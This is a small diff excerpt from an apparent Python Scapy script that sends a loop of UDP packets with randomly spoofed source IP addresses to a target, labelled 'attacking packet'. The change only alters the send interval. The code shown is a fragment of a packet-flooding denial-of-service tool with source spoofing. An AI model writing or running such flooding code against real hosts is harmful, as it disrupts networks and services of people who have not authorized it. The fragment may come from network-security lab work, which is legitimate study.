@@ -25,7 +25,7 @@ def main(dst_ip):
     S_PORT = 80
     for i in range(NUM_PACKET):
         packets = Ether() / IP(dst=dst_ip, src=getRandomSrcIP()) / UDP(dport = D_PORT, sport=S_PORT)
-        sendp(packets, iface=interface.rstrip(), inter=0.02)
+        sendp(packets, iface=interface.rstrip(), inter=0.2)
         print(f'Send attacking packet: {repr(packets)}')
 
 
